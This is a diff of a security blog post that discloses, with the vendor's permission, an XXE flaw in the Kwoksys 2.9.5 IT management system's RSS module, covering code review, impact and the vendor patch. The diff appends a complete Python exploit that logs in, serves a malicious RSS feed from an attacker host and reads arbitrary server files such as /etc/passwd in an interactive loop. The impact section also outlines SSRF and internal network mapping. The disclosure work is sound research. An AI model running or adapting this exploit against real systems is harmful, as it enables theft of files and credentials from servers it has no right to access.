@@ -3,26 +3,16 @@ title: "Kwoksys 2.9.5 XXE"
 date: 2022-11-12
 ---
 
-
 *This was disclosed with permission from the Kwoksys development team*
+<hr>
 
+In preparation to take the OSWE (Offensive Security Web Expert) exam, I've been auditing open source projects for security vulnerabilities to augment my studying. One of these open source projects that I stumbled upon was Kwoksys.
 
-In preparation to take my OSWE (Offensive Security Web Expert) exam, I've been auditing open source projects for security vulnerabilities to augment my study material. One of these projects that I stumbled upon was Kwoksys.
+Kwoksys is an open source IT management system that provides a centralized system for manging/tracking inventory, software licenses, issues, service contracts, and vendor contacts. Additionally, Kwoksys provides modules for building internal knowledge bases, portals, RSS feeds, and blogs. The project has been actively maintained since 2007 and has been downloaded 86,000+ times at the time of writing this blog post. The project is built on a Tomcat stack and uses a postgresql database for its backend.
 
-Kwoksys is an open source IT management system that provides a centralized system for manging/tracking inventory, software licenses, issues, service contracts, and vendor contacts. Additionally, Kwoksys provides modules for building internal knowledge bases, portals, RSS feeds, and blogs. The project has been actively maintained since 2007 and has been downloaded 86,000+ times at the time of writing this blog post.
+I spent a significant amount of time probing the application as an unauthenticated user with little success. The application has a very light unauthenticated presence with very few routes accessible without authentication. My search for authentication bypasses was fruitless
 
-The project is built on a Tomcat stack and uses a postgresql database for its backend.
-
-
-
-
-I spent a significant amount of time probing the application as an unauthenticated user with little success. The application has a very light unauthenticated presence with very few routes accessible without authentication.
-
-The login process was also solid and . The application offers no password reset option without authentication - further limiting our options.
-
-As a last resort - I searched for XSS vulnerabilities within files accessible without authentication but was unsuccessful.
-
-Satisfied with my review of the unauthenticated scope, I decided to switch to probing the application as an authenticated user.
+Eventually satisfied with my review of the unauthenticated scope, I decided to switch to probing the application as an authenticated user.
 
 After authenticating to the application we have access to a lot more modules to review. We'll focus on the RSS module.
 ![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112110829.png)
@@ -57,7 +47,7 @@ Here's an example of a basic RSS feed in XML format:
 
 As a security researcher this is definitely a component we need to review. Since the RSS feed has to support XML data, we can infer that some form of XML parsing is being done server-side. If the XML parser is weakly configured - we might be able to achieve XXE (XML External Entity) injection. For more information on XXE vulnerabilities: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 
-
+### Code Review
 Decompiling the kwok-2.9.5.jar in JD-GUI, we see that logic for the RSS parser is contained under com.kwoksys.framework.parsers.rss.
 
 ![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112113341.png)
@@ -245,17 +235,16 @@ Back on Kwoksys we see that there is a new blog entry:
 We have successfully exploited an external entity injection vulnerability. By changing the external entity value in the XML payload - we can now arbitrarily read any file on the server's filesystem.
 
 To speed up exploitation, we can build a script to change the XML payload based on whatever file we specify and to trigger a refresh of the RSS feed. Giving us a read-only psuedo shell to the system! Much faster!
-![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112141409.png)
-The exploit PoC script has been published to exploitDB here: 
+![Image](/images/2022-11-12-kwoksys-xxe/Pastedimage20221112141409.png)
 
-#### Impact
+### Impact
 
 XXE vulnerabilities are included in the OWASP Top 10 and are usually classified as high severity. As we've covered, XXE can be used to obtain access to sensitive configuration files on the local host, potentially leading to RCE.
 
 External entities can also point to remote locations, such as a web service running on another system. As an example, let's say that the Kwoksys system can reach other systems within its internal network that are inaccessible to an attacker. An attacker could leverage XXE to make requests from the Kwoksys server (SSRF (Server-Side Request Forgery)). Alternatively, using a time-based approach, an attacker could use XXE to map out an internal network to see what hosts are alive based on how quickly the server can process an external entity to a remote server.
 
 
-#### Patch Review
+### Patch Review
 
 After reporting this to the Kwoksys team - they quickly deployed a patch [2.9.5.SP31] which addresses this.
 ![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112104410.png)
@@ -276,3 +265,172 @@ When hunting for vulnerabilities, your eyes should be drawn to custom code. Howe
 Thank you for reading!
 
 
+### Exploit PoC
+```python
+#/usr/bin/env python
+#
+# Exploit Title       : XXE via Crafted RSS Feed
+# Author              : navsec
+# Vulnerable Software : https://www.kwoksys.com
+#
+# Usage : KwokSys v2.9.5 contains an XXE vulnerability that can be triggered by an
+#         authenticated user with privileged access to the RSS module to obtain full file system access.
+#	  XXE can also be used to map internal networks or internal services or conduct SSRF attacks.
+          
+# DISCLAIMER: This PoC is provided for educational purposes only.
+
+from http.server import SimpleHTTPRequestHandler
+from xml.etree.ElementTree import XML
+import requests, argparse, colorama
+import urllib.parse
+import sys, socketserver, threading, time
+import re, html
+
+class kwoksys:
+    def __init__(self, url, username, password, LHOST, LPORT) -> None:
+        self.url = url
+        self.username = username
+        self.password = password
+        self.LHOST = LHOST
+        self.LPORT = LPORT
+        self.session = requests.Session()
+    def requestHelper(self, path, method, data=""):
+        headers = {
+            'Host': '172.16.77.21:8080',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',
+            'charset': 'utf-8',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
+            'Content-type': 'application/x-www-form-urlencoded',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'close',
+        }
+
+        if method == 'POST':
+            response = self.session.post(url=self.url + path, headers=headers, data=data, verify=False)
+            return response
+        elif method == 'GET':
+            response = self.session.get(url=self.url + path, headers=headers, verify=False)
+            return response
+	   
+    # Take user input and modify the payload
+    def update_payload(self, file):
+        XML_PAYLOAD = '''
+        <!DOCTYPE title [ <!ELEMENT title ANY >
+        <!ENTITY xxe SYSTEM "file://{}">]>
+        <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+        <channel>
+            <title>Evil Blog</title>
+            <link>http://example.com/</link>
+            <description>A blog about things</description>
+            <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+            <item>
+                <title>&xxe;</title>
+                <link>http://example.com</link>
+                <description>a post</description>
+                <author>author@example.com</author>
+                <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+            </item>
+        </channel>
+        </rss>
+        '''.format(file)
+        try:
+            with open('./evil', 'w') as f:
+                f.write(XML_PAYLOAD)
+        except Exception as e:
+            print(e)
+
+    # Try and login using user-supplied credentials
+    def login(self):
+        data = 'redirectPath=&username=' + self.username + '&password=' + self.password
+        resp = self.requestHelper('/kwok/auth/verify-password.htm', 'POST', data)
+        return (resp.url)
+
+    # Determine if server is vulnerable.
+    def isVulnerable(self):
+        print('[+] Checking if Server is Vulnerable....')
+        if self.login().endswith('_error=true'):
+            print("[x] Login Failed - are the credentials correct?")
+            exit()
+
+        print("-- [+] Successfully Authenticated")
+        if self.requestHelper('/kwok/rss/feed-add.htm', 'GET').status_code != 200:
+            print("-- [X] User does not have valid permissions to RSS Module")
+            exit()
+        print("-- [+] Permissions are OK")
+        print("[o] Server is likely vulnerable - proceeding.")
+        return True
+
+    def retrieve(self, requestedFile, feedID):
+        self.update_payload(requestedFile)
+        data = 'feedId=' + feedID
+        data += '&feedUrl=' + urllib.parse.quote_plus('http://' + str(self.LHOST) + ':' + str(self.LPORT) + '/evil')
+        data += '&feedName=Evil%20Blog'
+        self.requestHelper('/kwok/rss/feed-edit-2.htm', 'POST', data)
+        fileResult = self.requestHelper('/kwok/rss/feed-list-items.htm?feedId=' + feedID, 'GET')
+        
+        rawText = urllib.parse.unquote((fileResult.content.decode()))
+        rawText = (html.unescape(rawText))
+        if 'Problem retrieving RSS feed' in rawText:
+            print("[X] File not found on target")
+            return
+        else:
+            match = re.search(r'rssTitle">(.*)</a></div>', rawText, re.DOTALL)
+            if match:
+                print(match.group(1))
+            #match = match.split('\\n')
+            #print('\n'.join(match))        
+        
+    def setup(self):
+        print('[+] Setting up our evil RSS feed')
+        # Change to win.ini if Windows
+        self.update_payload('/etc/passwd')
+        #TODO Make this dynamic and use a LHOST / LPORT param
+        data = 'feedUrl=' + urllib.parse.quote_plus('http://' + str(self.LHOST) + ':' + str(self.LPORT) + '/evil')
+        resp = self.requestHelper('/kwok/rss/feed-add-2.htm', 'POST', data)
+        #TODO Add logic here to check if this was successful ^
+
+        # Hunt for our newly created feed ID
+        for id in range(0,100):
+            result = self.requestHelper('/kwok/rss/feed-edit.htm?feedId=' + str(id), 'GET')
+            if (not 'Object Not Found' in str(result.content)):
+                if ('Evil Blog' in str(result.content)):
+                    feedID = str(id)
+                    print("[+] Found our evil RSS feed at ID: " + feedID)
+                    return feedID
+        print("[+] Could not find feed ID")
+        exit()
+
+class EvilHandler(SimpleHTTPRequestHandler):
+    # Overload log_message method to suppress access logs from being sent to stdout
+    def do_nothing(self):
+        pass
+    def log_message(self, format, *args):
+        logging = False
+
+def StartServer(PORT):
+    with socketserver.TCPServer(("", PORT), EvilHandler) as httpd:
+        print("[+] Payload Delivery Server now Listening ---> 0.0.0.0:{}".format(PORT))
+        httpd.serve_forever()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--url', '-b', required=True, dest='base_url', help='Kwoksys Base URL')
+    parser.add_argument('--user', '-u', required=True, dest='username', help='Username')
+    parser.add_argument('--password', '-p', required=True, dest='password', help='Password')
+    parser.add_argument('--mode', '-m', required=True, dest='mode', help='Mode')
+    parser.add_argument('--LHOST', '-lh', required=True, dest='LHOST', help='Local Address to Serve Payload from')
+    parser.add_argument('--LPORT', '-lp', required=True, dest='LPORT', help='Local Port to Serve Payload from')
+
+    args = parser.parse_args()
+    client = kwoksys(args.base_url, args.username, args.password, args.LHOST, args.LPORT)
+    if client.isVulnerable():
+        threading.Thread(target=StartServer, args=(int(args.LPORT),)).start()
+        time.sleep(1)
+        feedID = client.setup()
+    if args.mode == 'read_files':
+        while True:
+            requestedFile = input('File (Full Path):')
+            client.retrieve(requestedFile, feedID)
+```
